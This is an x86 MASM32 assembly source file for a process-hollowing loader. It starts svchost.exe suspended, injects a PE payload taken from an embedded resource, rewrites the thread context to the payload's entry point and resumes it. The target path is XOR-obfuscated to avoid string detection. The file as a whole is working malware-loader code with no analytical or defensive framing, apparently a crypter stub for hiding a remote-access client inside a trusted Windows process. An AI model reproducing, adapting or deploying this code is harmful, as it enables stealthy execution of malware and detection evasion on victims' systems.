.486
.model flat, stdcall
;.mmx
;.xmm
option casemap :none

include C:\masm32\include\windows.inc
include C:\masm32\include\user32.inc
includelib C:\masm32\lib\user32.lib
include C:\masm32\include\kernel32.inc
includelib C:\masm32\lib\kernel32.lib
include C:\masm32\include\msvcrt.inc
includelib C:\masm32\lib\msvcrt.lib
include C:\masm32\macros\macros.asm
include C:\masm32\include\ntdll.inc
includelib C:\masm32\lib\ntdll.lib

include strEnc.asm
include Fork.inc

;typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE,PBOOL)
FN_ISWOW64PROCESS typedef proto stdcall :HANDLE, :PBOOL
LPFN_ISWOW64PROCESS typedef ptr FN_ISWOW64PROCESS

;include c:\masm32\include\masm32.inc





.data
	;szName	BYTE	"C:\\windows\\explorer.exe", 0
	szName  db		xorstr("C:\Windows\System32\svchost.exe",25), 0
	;szName  db		'C:\Windows\System32\svchost.exe', 0
	SysWowName	db	xorstr("C:\Windows\SysWOW64\svchost.exe",25), 0
	Knel		db 'kernel32', 0
	wow64		db 'IsWow64Process', 0
	;SysWowName	db	"C:\\ChildWindow.exe",0
					;       
	;hszName BYTE	43h,3ah,5ch,5ch,77h,69h,6eh,64h,6fh,77h,73h,5ch,5ch,65h,78h,70h,6ch,6fh,72h,65h,72h,2eh,65h,78h,65h, 0
.data?



.code
main proc
	LOCAL pIDH:ptr IMAGE_DOS_HEADER
	LOCAL pINH:ptr IMAGE_NT_HEADERS
	LOCAL pISH:ptr IMAGE_SECTION_HEADER
	LOCAL image, mem, base:PVOID
	;LOCAL i, read, nSizeOfFile:DWORD
	;LOCAL hFile:HANDLE
	LOCAL sui:STARTUPINFO
	LOCAL pi:PROCESS_INFORMATION
	LOCAL ctx:CONTEXT 
	LOCAL hrsrc:HRSRC
	LOCAL dwSize:DWORD
	LOCAL ERR:DWORD
	LOCAL hGlbl:HGLOBAL
	LOCAL lpBuffer:DWORD
	LOCAL hMem:HGLOBAL
	LOCAL phMem:LPVOID
	LOCAL lpRBuffer:ptr BYTE
	LOCAL lpMemory:ptr BYTE
	LOCAL I:DWORD
	LOCAL isWow64:DWORD
	LOCAL bISWOW:DWORD
	LOCAL fnIsWow64Process:LPFN_ISWOW64PROCESS
Rtry:


	invoke GetModuleHandle, addr Knel
	invoke GetProcAddress, eax, addr wow64
	cmp eax, 1
	jb	ntWow
	mov fnIsWow64Process,eax 
	invoke GetCurrentProcess
	mov		ebx, eax
	invoke fnIsWow64Process, ebx, addr bISWOW
	cmp eax, 1
	jb  ntWow

	mov	ctx.ContextFlags, CONTEXT_FULL
	invoke memset, addr sui, 0, sizeof sui
	invoke memset, addr pi, 0, sizeof pi

	;xormem szName, 26, 25
		invoke GetCurrentProcess
		mov		ebx, eax

		invoke IsWow64Process, ebx, addr isWow64
	;printf("IsWow64: ", isWow64)
		cmp		isWow64, 1
		je		IsWow
	ntWow:
		xormem szName, 31, 25
		mov	esi, OFFSET szName
		mov	bISWOW, 0
		jmp ContWow
	IsWow:
		xormem SysWowName, 31, 25
		mov esi, OFFSET SysWowName
		mov	bISWOW, 1
		
	ContWow:
	;printf("%s", esi)
	invoke CreateProcess,NULL, esi, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, addr sui, addr pi
	invoke GetLastError
	invoke FindResource, NULL,IDR_CLIENT, RT_RCDATA
	mov	hrsrc, eax
	invoke SizeofResource, NULL, hrsrc
	mov	dwSize, eax
	invoke LoadResource, NULL, hrsrc
	invoke LockResource, eax
	mov lpRBuffer, eax
	invoke VirtualAlloc, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE
	mov lpMemory, eax
	invoke memcpy, lpMemory, lpRBuffer, dwSize
	

	push lpMemory
	pop pIDH
	mov esi, pIDH
	assume esi:ptr IMAGE_DOS_HEADER
	cmp [esi].e_magic, IMAGE_DOS_SIGNATURE
	jne Rtry
	add esi, [esi].e_lfanew
	push esi
	pop pINH
	invoke CreateFile, NULL, NULL, NULL, NULL, NULL, NULL, NULL

	invoke NtGetContextThread, pi.hThread, addr ctx
	;invoke GetLastError
	mov ecx, ctx.regEbx
	add ecx, 8
	invoke NtReadVirtualMemory, pi.hProcess, ecx, addr base, sizeof PVOID, NULL
	;invoke GetLastError
	mov esi, pINH
	assume esi:ptr IMAGE_NT_HEADERS
	invoke VirtualAllocEx, pi.hProcess, [esi].OptionalHeader.ImageBase, [esi].OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE
	.if eax
		mov mem, eax
		invoke NtWriteVirtualMemory, pi.hProcess, mem, lpMemory, [esi].OptionalHeader.SizeOfHeaders, NULL
		;mov edi, dword ptr[pINH]
		movzx edi, word ptr[esi+6]
		mov	ebx,0
	;	printf("Sections: %i %i", edi, [esi].FileHeader.NumberOfSections)
		.while ebx < edi
			mov eax, pIDH
			mov ecx, lpMemory
			add ecx, [eax + 3Ch]
		    imul edx, ebx, 28h
			lea eax, [ecx+edx+0F8h]
			mov pISH, eax

			mov ecx, pISH
			mov eax, mem
			add eax, dword ptr[ecx+0Ch]

			mov edx,lpMemory
			add edx, dword ptr[ecx+14h]

			
			invoke NtWriteVirtualMemory, pi.hProcess, eax, edx, [ecx+10h], NULL


			add ebx, 1
		.endw
		mov eax, mem
		add eax, [esi].OptionalHeader.AddressOfEntryPoint
		
		mov ctx.regEax, eax
		mov ebx, ctx.regEbx
		add ebx, 8

		invoke NtWriteVirtualMemory, pi.hProcess, ebx, addr [esi].OptionalHeader.ImageBase, sizeof PVOID, NULL
		invoke NtSetContextThread, pi.hThread, addr ctx
		invoke NtResumeThread, pi.hThread, addr ctx

	;	invoke NtWaitForSingleObject, pi.hProcess, FALSE, NULL


	.else
		INVOKE NtTerminateProcess, pi.hProcess, 1
		jmp Rtry
	.endif
	xor eax, eax
	invoke ExitProcess, eax
	
	
	ret

	


main endp

end main